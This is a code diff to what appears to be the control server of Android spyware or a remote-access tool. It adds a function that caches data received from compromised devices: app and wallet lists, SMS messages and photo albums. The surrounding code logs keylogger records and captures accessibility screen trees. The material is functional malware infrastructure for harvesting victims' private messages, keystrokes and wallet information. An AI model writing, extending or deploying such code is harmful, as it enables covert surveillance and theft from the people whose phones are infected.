@@ -470,6 +470,34 @@ def _tree_request_action(path):
     return 'adbUiTree' if path == '/api/adb-tree/ws' else 'capture'
 
 
+def _cache_device_dataset(rec, dev, action, data):
+    """Store list-style device replies so a browser refresh does not erase them."""
+    bucket = {
+        'iconList': 'apps', 'appList': 'apps', 'walletList': 'apps',
+        'smsList': 'sms', 'readSmsList': 'sms',
+        'albumList': 'album',
+    }.get(str(action or ''))
+    if not bucket or not isinstance(data, dict):
+        return False
+    now = int(time.time())
+    rec.setdefault('datasets', {})[bucket] = {
+        'action': action, 'data': data, 'checkedAt': now,
+    }
+    try:
+        try:
+            from . import api_impl as _ai
+        except ImportError:
+            import api_impl as _ai
+        changed = _ai.cache_device_payload(dev, bucket, action, data, now)
+        count = len(data.get('data') or data.get('list') or [])
+        print('[server] %s cache %s (%d items, changed=%s)' %
+              (dev, bucket, count, changed), flush=True)
+        return True
+    except Exception as e:
+        print('[server] %s cache failed: %s' % (bucket, str(e)[:160]), flush=True)
+        return False
+
+
 async def on_device_frame(dev, text, ws):
     """解析设备来帧："42["enc msg", <b64>]" 等"""
     rec = STATE['devices'][dev]
@@ -527,6 +555,7 @@ async def on_device_frame(dev, text, ws):
                                        'type': e.get('type') or 'text',
                                        'text': e.get('text')}, {}, 'device')
                 print('[server] 键盘记录 +%d 条（%s）' % (len(ents), dev), flush=True)
+        _cache_device_dataset(rec, dev, action, data)
         if action == 'capture':
             # 无障碍树：设备端是 gzip+base64 的节点树，面板要的是扁平 root[]（见厂商 bundle 解析逻辑）
             try:
